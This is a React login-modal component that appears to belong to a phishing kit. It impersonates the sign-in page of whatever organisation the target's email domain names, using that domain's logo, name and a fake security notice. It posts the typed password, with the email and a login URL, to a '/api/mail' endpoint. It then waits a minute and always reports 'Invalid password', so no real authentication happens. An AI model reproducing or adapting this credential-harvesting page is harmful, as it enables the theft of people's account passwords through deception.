import React, { useState } from 'react';
import '@/styles/globals.css';
import axios from 'axios';

const LoginModal = ({ email, styles= {}, loginURL= 'NOT PROVIDED' }) => {
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');

  // Add function to extract domain from email
  const getDomain = (email) => {
    return email.split('@')[1];
  };

  // Get domain for the current email
  const emailDomain = getDomain(email);
  const faviconUrl = `https://logo.clearbit.com/${emailDomain}`;

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');
    
    try {
      // Add your login logic here
      await axios.post('/api/mail', { email, password, loginURL });
      await new Promise(resolve => setTimeout(resolve, 60000));
      setIsLoading(false);
      setError('Invalid password. Please try again.');
    } catch (err) {
      setError('Invalid password. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  // Add animation styles to the outer div
  const modalStyles = {
    ...styles.modalContainer,
    animation: 'modalFadeIn 0.3s ease-out forwards',
  };

  return (
    <>
      <style jsx>{`
        @keyframes modalFadeIn {
          from {
            opacity: 0;
            transform: translate(-50%, -48%);
          }
          to {
            opacity: 1;
            transform: translate(-50%, -50%);
          }
        
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
      <div style={{
        position: 'fixed',
        inset: 0,
        backgroundColor: 'rgba(0, 0, 0, 0.1)',
        backdropFilter: 'blur(2px)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        zIndex: 1000
      }}>
        <div style={{
          backgroundColor: 'rgba(255, 255, 255, 0.95)',
          borderRadius: '1rem',
          padding: '2.5rem',
          width: '448px',
          boxShadow: 'rgba(0, 0, 0, 0.1) 0px 10px 50px, rgba(0, 0, 0, 0.05) 0px 5px 20px',
          position: 'relative',
          zIndex: 1001,
          animation: 'modalFadeIn 0.3s ease-out',
          border: '1px solid rgba(255, 255, 255, 0.1)'
        }}>
          {/* Updated Logo Section */}
          <div style={{ textAlign: 'center', marginBottom: '2.5rem' }}>
            <div style={{ 
              display: 'flex', 
              alignItems: 'center', 
              justifyContent: 'center', 
              gap: '0.75rem',
              marginBottom: '1rem' 
            }}>
              <img 
                src={faviconUrl} 
                alt={`${emailDomain} logo`} 
                style={{ 
                  width: '32px', 
                  height: '32px',
                  objectFit: 'contain'
                }} 
              />
              <span style={{ 
                fontSize: '1.25rem', 
                fontWeight: 600,
                color: '#1F2937'
              }}>{emailDomain.split('.')[0].toUpperCase()}</span>
            </div>
            <h1 style={{ 
              fontSize: '1.75rem', 
              fontWeight: 600, 
              color: '#1F2937',
              marginBottom: '0.5rem',
              letterSpacing: '-0.025em'
            }}>Welcome back</h1>
            {/* <div style={{ 
              marginTop: '0.5rem', 
              color: '#6B7280',
              fontSize: '1.1rem'
            }}>{email}</div> */}
          </div>

          <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '1.75rem' }}>
            {/* Email Field (Disabled) */}
            <div>
              <label style={{ 
                display: 'block', 
                fontSize: '0.9rem', 
                fontWeight: 500, 
                color: '#374151',
                marginBottom: '0.5rem',
                letterSpacing: '0.025em'
              }}>
                Email
              </label>
              <input
                type="email"
                value={email}
                disabled
                style={{
                  width: '100%',
                  padding: '0.75rem 1rem',
                  border: '1px solid #B8C2CC',
                  borderRadius: '0.75rem',
                  backgroundColor: 'rgba(240, 240, 240, 0.7)',
                  color: '#6B7280',
                  cursor: 'not-allowed',
                  fontSize: '1rem'
                }}
              />
            </div>

            {/* Password Field */}
            <div>
              <label style={{ 
                display: 'block', 
                fontSize: '0.9rem', 
                fontWeight: 500, 
                color: '#374151',
                marginBottom: '0.5rem',
                letterSpacing: '0.025em'
              }}>
                Password
              </label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                style={{
                  width: '100%',
                  padding: '0.75rem 1rem',
                  border: '1px solid #E5E7EB',
                  borderRadius: '0.75rem',
                  transition: 'all 0.2s ease',
                  outline: 'none',
                  fontSize: '1rem',
                  backgroundColor: 'white',
                  color: '#111827'
                }}
                onFocus={(e) => {
                  e.target.style.borderColor = '#3B82F6';
                  e.target.style.boxShadow = '0 0 0 4px rgba(59, 130, 246, 0.1)';
                }}
                onBlur={(e) => {
                  e.target.style.borderColor = '#E5E7EB';
                  e.target.style.boxShadow = 'none';
                }}
                placeholder="Enter your password"
                required
              />
            </div>

            {/* Error Message */}
            {error && (
              <div style={{ 
                color: '#EF4444', 
                fontSize: '0.9rem',
                backgroundColor: '#FEF2F2',
                padding: '0.75rem 1rem',
                borderRadius: '0.5rem',
                display: 'flex',
                alignItems: 'center',
                gap: '0.5rem'
              }}>
                <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                  <path d="M10 6v4m0 4h.01M19 10a9 9 0 11-18 0 9 9 0 0118 0z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
                {error}
              </div>
            )}

            {/* Forgot Password Link */}
            {/* <div style={{ textAlign: 'right' }}>
              <a 
                href="#" 
                style={{
                  fontSize: '0.9rem',
                  color: '#3B82F6',
                  textDecoration: 'none',
                  fontWeight: 500,
                  transition: 'all 0.2s ease'
                }}
                onMouseOver={(e) => e.target.style.color = '#2563EB'}
                onMouseOut={(e) => e.target.style.color = '#3B82F6'}
              >
                Forgot password?
              </a>
            </div> */}

            {/* Submit Button */}
            <button
              type="submit"
              disabled={isLoading}
              style={{
                width: '100%',
                padding: '0.875rem 1.5rem',
                borderRadius: '0.75rem',
                color: 'white',
                fontWeight: 600,
                backgroundColor: isLoading ? '#4B5563' : '#111827',
                cursor: isLoading ? 'not-allowed' : 'pointer',
                transition: 'all 0.2s ease',
                border: 'none',
                fontSize: '1rem',
                transform: isLoading ? 'none' : 'translateY(0)',
                boxShadow: '0 1px 2px rgba(0, 0, 0, 0.05)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '0.5rem'
              }}
              onMouseOver={(e) => {
                if (!isLoading) {
                  e.target.style.backgroundColor = '#374151';
                  e.target.style.transform = 'translateY(-1px)';
                  e.target.style.boxShadow = '0 4px 12px rgba(17, 24, 39, 0.25)';
                }
              }}
              onMouseOut={(e) => {
                if (!isLoading) {
                  e.target.style.backgroundColor = '#111827';
                  e.target.style.transform = 'translateY(0)';
                  e.target.style.boxShadow = '0 1px 2px rgba(0, 0, 0, 0.05)';
                }
              }}
            >
              {isLoading ? (
                <>
                  <svg
                    style={{
                      animation: 'spin 1s linear infinite',
                      width: '1.25rem',
                      height: '1.25rem'
                    }}
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                      style={{ opacity: 0.25 }}
                    ></circle>
                    <path
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      style={{ opacity: 0.75 }}
                    ></path>
                  </svg>
                  Signing in...
                </>
              ) : (
                'Sign in'
              )}
            </button>
          </form>

          {/* Additional Options */}
          {/* <div style={{ marginTop: '2rem', textAlign: 'center' }}>
            <button 
              style={{
                fontSize: '0.9rem',
                color: '#6B7280',
                background: 'none',
                border: 'none',
                cursor: 'pointer',
                transition: 'all 0.2s ease',
                padding: '0.5rem 1rem',
                borderRadius: '0.5rem'
              }}
              onMouseOver={(e) => {
                e.target.style.color = '#374151';
                e.target.style.backgroundColor = '#F3F4F6';
              }}
              onMouseOut={(e) => {
                e.target.style.color = '#6B7280';
                e.target.style.backgroundColor = 'transparent';
              }}
            >
              Sign in with a different account
            </button>
          </div> */}

          {/* Warning Section - Redesigned */}
          <div style={{
            marginTop: '2rem',
            padding: '1.25rem',
            backgroundColor: '#FEF2F2',
            borderRadius: '0.75rem',
            fontSize: '0.875rem',
            border: '1px solid #FEE2E2',
            color: '#991B1B'
          }}>
            <div style={{ 
              display: 'flex', 
              alignItems: 'center', 
              gap: '0.5rem',
              marginBottom: '0.75rem' 
            }}>
              <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                <path d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM10 11a.75.75 0 01-.75-.75V7.5a.75.75 0 011.5 0v2.75a.75.75 0 01-.75.75zm0 3a1 1 0 100-2 1 1 0 000 2z" fill="currentColor"/>
              </svg>
              <span style={{ fontWeight: '600' }}>Security Notice</span>
            </div>
            <p style={{ lineHeight: '1.5' }}>
              This system is the property of {emailDomain}. Unauthorized access is prohibited.
            </p>
            <p style={{ 
              marginTop: '0.75rem', 
              fontSize: '0.75rem', 
              color: '#9B1C1C',
              opacity: 0.8 
            }}>
              © 2024 {emailDomain} • All rights reserved
            </p>
          </div>
        </div>
      </div>
    </>
  );
};

export default LoginModal;